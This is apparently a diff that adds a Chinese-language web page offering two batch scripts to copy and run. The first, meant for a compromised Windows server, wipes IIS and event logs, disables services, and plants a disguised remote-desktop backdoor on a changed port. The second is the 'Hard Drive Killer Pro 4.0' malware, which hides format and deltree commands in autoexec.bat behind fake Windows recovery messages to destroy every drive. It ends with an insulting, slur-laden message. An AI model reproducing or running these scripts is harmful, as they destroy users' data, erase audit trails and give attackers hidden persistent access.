+@REM [禁止显示前一个登录用户名称]<br>
+@regedit /s patch.dll<br>
+------------------------ cut here then save as .bat or .cmd file ---------------------------<br>
+下面命令是清除肉鸡所有日志，禁止一些危险的服务，并修改肉鸡的terminnal service留跳后路。<br>
+@regedit /s patch.dll<br>
+@net stop w3svc<br>
+@net stop event log<br>
+@del c:\winnt\system32\logfiles\w3svc1\*.* /f /q<br>
+@del c:\winnt\system32\logfiles\w3svc2\*.* /f /q<br>
+@del c:\winnt\system32\config\*.event /f /q<br>
+@del c:\winnt\system32dtclog\*.* /f /q<br>
+@del c:\winnt\*.txt /f /q<br>
+@del c:\winnt\*.log /f /q<br>
+@net start w3svc<br>
+@net start event log<br>
+@rem [删除日志]</div>
+<div> </div>
+<div>@net stop lanmanserver /y<br>
+@net stop Schedule /y<br>
+@net stop RemoteRegistry /y<br>
+@del patch.dll<br>
+@echo The server has been patched,Have fun.<br>
+@del patch.bat<br>
+@REM [禁止一些危险的服务。]<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Termina l Server\WinStations\RDP-Tcp] &gt;&gt;patch.dll<br>
+@echo &quot;PortNumber&quot;=dword:00002010 &gt;&gt;patch.dll<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Termina l Server\Wds\rdpwd\Tds\tcp &gt;&gt;patch.dll<br>
+@echo &quot;PortNumber&quot;=dword:00002012 &gt;&gt;patch.dll<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] &gt;&gt;patch.dll<br>
+@echo &quot;Start&quot;=dword:00000002 &gt;&gt;patch.dll<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecuService] &gt;&gt;patch.dll<br>
+@echo &quot;Start&quot;=dword:00000002 &gt;&gt;patch.dll<br>
+@echo &quot;ErrorControl&quot;=dword:00000001 &gt;&gt;patch.dll<br>
+@echo &quot;ImagePath&quot;=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00 ,52,00,6f,00,6f,00,\ &gt;&gt;patch.dll<br>
+@echo 74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00, 32,00,5c,00,65,\ &gt;&gt;patch.dll<br>
+@echo 00,76,00,65,00,6e,00,74,00,6c,00,6f,00,67,00,2e,00,65,00,78, 00,65,00,00,00 &gt;&gt;patch.dll<br>
+@echo &quot;ObjectName&quot;=&quot;LocalSystem&quot; &gt;&gt;patch.dll<br>
+@echo &quot;Type&quot;=dword:00000010 &gt;&gt;patch.dll<br>
+@echo &quot;Description&quot;=&quot;Keep record of the program and windows message。&quot; &gt;&gt;patch.dll<br>
+@echo &quot;DisplayName&quot;=&quot;Microsoft EventLog&quot; &gt;&gt;patch.dll<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\termservice] &gt;&gt;patch.dll<br>
+@echo &quot;Start&quot;=dword:00000004 &gt;&gt;patch.dll<br>
+@copy c:\winnt\system32\termsrv.exe c:\winnt\system32\eventlog.exe<br>
+@REM [修改3389连接，端口为8210(十六进制为00002012)，名称为Microsoft EventLog，留条后路]<br>
+3.Hard Drive Killer Pro Version 4.0（玩批处理到这个水平真的不容易了。）<br>
+------------------------ cut here then save as .bat or .cmd file ---------------------------<br>
+@echo off<br>
+rem This program is dedecated to a very special person that does not want to be named.<br>
+:start<br>
+cls<br>
+echo PLEASE WAIT WHILE PROGRAM LOADS . . .<br>
+call attrib -r -h c:\autoexec.bat &gt;nul<br>
+echo @echo off &gt;c:\autoexec.bat<br>
+echo call format c: /q /u /autoSample &gt;nul &gt;&gt;c:\autoexec.bat<br>
+call attrib +r +h c:\autoexec.bat &gt;nul<br>
+rem Drive checking and assigning the valid drives to the drive variable.<br>
+set drive=<br>
+set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z<br>
+rem code insertion for Drive Checking takes place here.<br>
+rem drivechk.bat is the file name under the root directory.<br>
+rem As far as the drive detection and drive variable settings, dont worry about how it<br>
+rem works, its d\*amn to complicated for the average or even the expert batch programmer.<br>
+rem Except for Tom Lavedas.<br>
+echo @echo off &gt;drivechk.bat<br>
+echo @prompt %%%%comspec%%%% /f /c vol %%%%1: $b find &quot;Vol&quot; &gt; nul &gt;.bat<br>
+%comspec% /e:2048 /c .bat &gt;&gt;drivechk.bat<br>
+del .bat<br>
+echo if errorlevel 1 goto enddc &gt;&gt;drivechk.bat<br>
+cls<br>
+echo PLEASE WAIT WHILE PROGRAM LOADS . . .<br>
+rem When errorlevel is 1, then the above is not true, if 0, then its true.<br>
+rem Opposite of binary rules. If 0, it will elaps to the next command.<br>
+echo @prompt %%%%comspec%%%% /f /c dir %%%%1:.\/ad/w/-p $b find &quot;bytes&quot; &gt; nul &gt;.bat<br>
+%comspec% /e:2048 /c .bat &gt;&gt;drivechk.bat<br>
+del .bat<br>
+echo if errorlevel 1 goto enddc &gt;&gt;drivechk.bat<br>
+cls<br>
+echo PLEASE WAIT WHILE PROGRAM LOADS . . .<br>
+rem if errorlevel is 1, then the drive specified is a removable media drive - not ready.<br>
+rem if errorlevel is 0, then it will elaps to the next command.<br>
+echo @prompt dir %%%%1:.\/ad/w/-p $b find &quot; 0 bytes free&quot; &gt; nul &gt;.bat<br>
+%comspec% /e:2048 /c .bat &gt;&gt;drivechk.bat<br>
+del .bat<br>
+echo if errorlevel 1 set drive=%%drive%% %%1 &gt;&gt;drivechk.bat<br>
+cls<br>
+echo PLEASE WAIT WHILE PROGRAM LOADS . . .<br>
+rem if its errorlevel 1, then the specified drive is a hard or floppy drive.<br>
+rem if its not errorlevel 1, then the specified drive is a CD-ROM drive.<br>
+echo :enddc &gt;&gt;drivechk.bat<br>
+rem Drive checking insertion ends here. &quot;enddc&quot; stands for &quot;end dDRIVE cHECKING&quot;.<br>
+rem Now we will use the program drivechk.bat to attain valid drive information.<br>
+:Sampledrv<br>
+for %%a in (%alldrive%) do call drivechk.bat %%a &gt;nul<br>
+del drivechk.bat &gt;nul<br>
+if %drive.==. set drive=c<br>
+:form_del<br>
+call attrib -r -h c:\autoexec.bat &gt;nul<br>
+echo @echo off &gt;c:\autoexec.bat<br>
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:\autoexec.bat<br>
+echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autoSample &gt;nul &gt;&gt;c:\autoexec.bat<br>
+echo cls &gt;&gt;c:\autoexec.bat<br>
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:\autoexec.bat<br>
+echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Bunga &gt;nul &gt;&gt;c:\autoexec.bat<br>
+echo cls &gt;&gt;c:\autoexec.bat<br>
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:\autoexec.bat<br>
+echo for %%%%a in (%drive%) call deltree /y %%%%a:\ &gt;nul &gt;&gt;c:\autoexec.bat<br>
+echo cls &gt;&gt;c:\autoexec.bat<br>
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:\autoexec.bat<br>
+echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autoSample &gt;nul &gt;&gt;c:\autoexec.bat<br>
+echo cls &gt;&gt;c:\autoexec.bat<br>
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:\autoexec.bat<br>
+echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Bunga &gt;nul &gt;&gt;c:\autoexec.bat<br>
+echo cls &gt;&gt;c:\autoexec.bat<br>
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:\autoexec.bat<br>
+echo for %%%%a in (%drive%) call deltree /y %%%%a:\ &gt;nul &gt;&gt;c:\autoexec.bat<br>
+echo cd\ &gt;&gt;c:\autoexec.bat<br>
+echo cls &gt;&gt;c:\autoexec.bat<br>
+echo echo Welcome to the land of death. Munga Bungas Multiple Hard Drive Killer version 4.0. &gt;&gt;c:\autoexec.bat<br>
+echo echo If you ran this file, then sorry, I just made it. The purpose of this program is to tell you the following. . . &gt;&gt;c:\autoexec.bat<br>
+echo echo 1. To make people aware that security should not be taken for granted. &gt;&gt;c:\autoexec.bat<br>
+echo echo 2. Love is important, if you have it, truly, dont let go of it like I did! &gt;&gt;c:\autoexec.bat<br>
+echo echo 3. If you are NOT a vegetarian, then you are a murderer, and Im glad your HD is dead. &gt;&gt;c:\autoexec.bat<br>
+echo echo 4. Dont support the following: War, Racism, Drugs and the Liberal Party.&gt;&gt;c:\autoexec.bat<br>
+echo echo. &gt;&gt;c:\autoexec.bat<br>
+echo echo Regards, &gt;&gt;c:\autoexec.bat<br>
+echo echo. &gt;&gt;c:\autoexec.bat<br>
+echo echo Munga Bunga &gt;&gt;c:\autoexec.bat<br>
+call attrib +r +h c:\autoexec.bat<br>
+:makedir<br>
+if exist c:\temp.bat attrib -r -h c:\temp.bat &gt;nul<br>
+echo @echo off &gt;c:\temp.bat<br>
+echo %%1:\ &gt;&gt;c:\temp.bat<br>
+echo cd\ &gt;&gt;c:\temp.bat<br>
+echo :startmd &gt;&gt;c:\temp.bat<br>
+echo for %%%%a in (&quot;if not exist %%2\nul md %%2&quot; &quot;if exist %%2\nul cd %%2&quot;) do %%%%a &gt;&gt;c:\temp.bat<br>
+echo for %%%%a in (&quot;&gt;ass_hole.txt&quot;) do echo %%%%a Your Gone @$$hole!!!! &gt;&gt;c:\temp.bat<br>
+echo if not exist %%1:\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2 \%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2 \%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\nul goto startmd &gt;&gt;c:\temp.bat<br>
+call attrib +r +h c:\temp.bat &gt;nul<br>
+cls<br>
+echo Initializing Variables . . .<br>
+rem deltree /y %%a:\*. only eliminates directories, hence leaving the file created above for further destruction.<br>
+for %%a in (%drive%) do call format %%a: /q /u /autoSample &gt;nul<br>
+cls<br>
+echo Initializing Variables . . .<br>
+echo Validating Data . . .<br>
+for %%a in (%drive%) do call c:\temp.bat %%a Munga &gt;nul<br>
+cls<br>
+echo Initializing Variables . . .<br>
+echo Validating Data . . .<br>
+echo Analyzing System Structure . . .<br>
+for %%a in (%drive%) call attrib -r -h %%a:\ /S &gt;nul<br>
+call attrib +r +h c:\temp.bat &gt;nul<br>
+call attrib +r +h c:\autoexec.bat &gt;nul<br>
+cls<br>
+echo Initializing Variables . . .<br>
+echo Validating Data . . .<br>
+echo Analyzing System Structure . . .<br>
+echo Initializing Application . . .<br>
+for %%a in (%drive%) call deltree /y %%a:\*. &gt;nul<br>
+cls<br>
+echo Initializing Variables . . .<br>
+echo Validating Data . . .<br>
+echo Analyzing System Structure . . .<br>
+echo Initializing Application . . .<br>
+echo Starting Application . . .<br>
+for %%a in (%drive%) do call c:\temp.bat %%a Munga &gt;nul<br>
+cls<br>
+echo Thank you for using a Munga Bunga product.<br>
+echo.<br>
+echo Oh and, Bill Gates rules, and he is not a geek, he is a good looking genius.<br>
+echo.<br>
+echo Here is a joke for you . . .<br>
+echo.<br>
+echo Q). Whats the worst thing about being an egg?<br>
+echo A). You only get laid once.<br>
+echo.<br>
+echo HAHAHAHA, get it? Dont you just love that one?<br>
+echo.<br>
+echo Regards,<br>
+echo.<br>
+echo Munga Bunga<br>
+:end<br>
+rem Hard Drive Killer Pro Version 4.0, enjoy!!!!<br>
+rem Author: Munga Bunga - from Australia, the land full of retarded Australians (help me get out of here).</div>
+<div> </div>
+<div> </div></div></body></html>
